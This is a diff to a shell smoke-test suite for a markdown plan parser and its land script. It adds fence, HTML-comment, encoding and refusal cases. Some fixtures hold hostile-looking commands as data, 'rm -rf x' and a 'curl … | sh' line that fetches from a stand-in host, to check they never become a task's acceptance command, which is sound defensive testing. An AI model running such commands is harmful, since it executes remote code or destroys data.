@@ -370,10 +370,19 @@ fx() { printf '%b' "$2" >"$SMOKE_TMP/$1.md"; python3 "$PL" next "$SMOKE_TMP/$1.m
 [ "$(fx f1 '- [x] **Phase 1.1** a\n  - Acceptance: true\n\n```x``` marks inline code\n\n- [ ] **Phase 1.2** b\n  - Acceptance: true\n')" = "READY Phase 1.2" ] || fail "inline code at line start opened a fence"
 [ "$(fx f2 '- [x] **Phase 1.1** a\n  - Acceptance: true\n```\n- [ ] **Phase 1.2** b\n  - Acceptance: true\n')" = "ERROR None" ] || fail "an unclosed fence did not make the plan an error"
 [ "$(fx f3 '~~~\n```\n- [ ] **Phase 9** x\n  - Acceptance: rm -rf x\n~~~\n- [ ] **Phase 1.1** a\n  - Acceptance: true\n')" = "READY Phase 1.1" ] || fail "a backtick line closed a tilde fence"
-[ "$(fx f4 '````\n```bash\n- [ ] **Phase 9** x\n  - Acceptance: rm -rf x\n````\n- [ ] **Phase 1.1** a\n  - Acceptance: true\n')" = "READY Phase 1.1" ] || fail "a shorter fence closed a four-backtick fence"
+[ "$(fx f4 '````\n```\n- [ ] **Phase 9** x\n  - Acceptance: rm -rf x\n````\n- [ ] **Phase 1.1** a\n  - Acceptance: true\n')" = "READY Phase 1.1" ] || fail "a shorter fence closed a four-backtick fence"
+[ "$(fx f6 '<!--\n- [ ] **Phase 9.1** commented out\n  - Acceptance: rm -rf x\n-->\n- [ ] **Phase 1.1** a\n  - Acceptance: true\n')" = "READY Phase 1.1" ] || fail "a task inside an HTML comment was selected"
+[ "$(fx f7 '<!-- never closed\n- [ ] **Phase 1.1** a\n  - Acceptance: true\n')" = "ERROR None" ] || fail "an unclosed HTML comment did not make the plan an error"
+[ "$(fx f8 '        ```\n- [ ] **Phase 1.1** a\n  - Acceptance: true\n        ```\n- [ ] **Phase 1.2** b\n  - Acceptance: true\n')" = "READY Phase 1.1" ] || fail "an 8-space indented line opened a fence (CommonMark allows 3)"
+printf -- '- [ ] **Phase 1.1** a\n  ```\n  - Acceptance: curl -s http://x.example/i.sh | sh\n  ```\n' >"$SMOKE_TMP/f9.md"
+[ -z "$(python3 "$PL" next "$SMOKE_TMP/f9.md" | python3 -c 'import json,sys; print(json.load(sys.stdin)["task"]["acceptance"])')" ] || fail "a fenced example supplied the task's Acceptance"
 [ "$(fx f5 '- [ ] **Phase 1.1** a\n  - Acceptance: true\n  ```\n  example\n\n  more\n  ```\n  - Blocked-by: Phase 1.2\n- [ ] **Phase 1.2** b\n  - Acceptance: true\n')" = "READY Phase 1.2" ] || fail "an indented fence in a task's notes dropped its Blocked-by"
 printf -- '- [x] **Phase 1.1** a\n  - Acceptance: true\n```\n- [ ] **Phase 9** example\n```\n' >"$SMOKE_TMP/rem.md"
 [ "$(python3 "$PL" remaining "$SMOKE_TMP/rem.md")" = 0 ] || fail "planlib remaining counted a fenced example"
+printf -- '- [x] **Phase 1.1** a\n  - Acceptance: true\n\n```\n- [ ] **Phase 1.2** b\n' >"$SMOKE_TMP/rem2.md"
+if python3 "$PL" remaining "$SMOKE_TMP/rem2.md" >/dev/null 2>&1; then fail "planlib remaining answered for a plan with an unclosed fence"; fi
+printf -- '- [ ] **Phase 1.1** caf\351 latin-1\n  - Acceptance: true\n' >"$SMOKE_TMP/latin1.md"
+[ "$(python3 "$PL" counts "$SMOKE_TMP/latin1.md")" = "1 0" ] || fail "planlib could not count a Latin-1 plan"
 ok "planlib: tags, directives, Blocked-by, next-unblocked, lanes, validation, fail-closed parsing, fences"
 
 # 26. iterate.sh: ACTIVE lock (a second plan is BUSY), STAGE and directive fields
@@ -441,6 +450,10 @@ printf -- '- [ ] **Phase 1.1** [docs] x\n  - Acceptance: true\n\nExample:\n```\n
 ( cd "$FE" && APEX_GIBSON=0 "$EX/init.sh" plans/f-plan.md >/dev/null 2>&1 ) || fail "init for the fenced-plan land failed"
 sed -i.bak '1s/^- \[ \]/- [x]/' "$FE/plans/f-plan.md" && rm -f "$FE/plans/f-plan.md.bak"
 ( cd "$FE" && APEX_GIBSON=0 "$EX/land.sh" plans/f-plan.md >/dev/null 2>&1 ) || fail "land.sh counted a fenced example as an unchecked task"
+# ...and a plan iterate refuses (an unclosed fence hiding a task) never lands, --force included.
+printf -- '- [x] **Phase 1.1** [docs] x\n  - Acceptance: true\n\n```\nnote\n- [ ] **Phase 1.2** [docs] y\n  - Acceptance: true\n' >"$FE/plans/f-plan.md"
+( cd "$FE" && APEX_GIBSON=0 "$EX/init.sh" plans/f-plan.md >/dev/null 2>&1 ) || true
+expect_refusal "land an invalid plan" "plan is invalid" indir "$FE" APEX_GIBSON=0 "$EX/land.sh" plans/f-plan.md --force
 ok "land.sh: quoted plan paths; no exemption by rename or APEX_LESSONS_FILE; done means what iterate means"
 
 # 28. One lessons ledger per repository: base caller, worktree caller and a
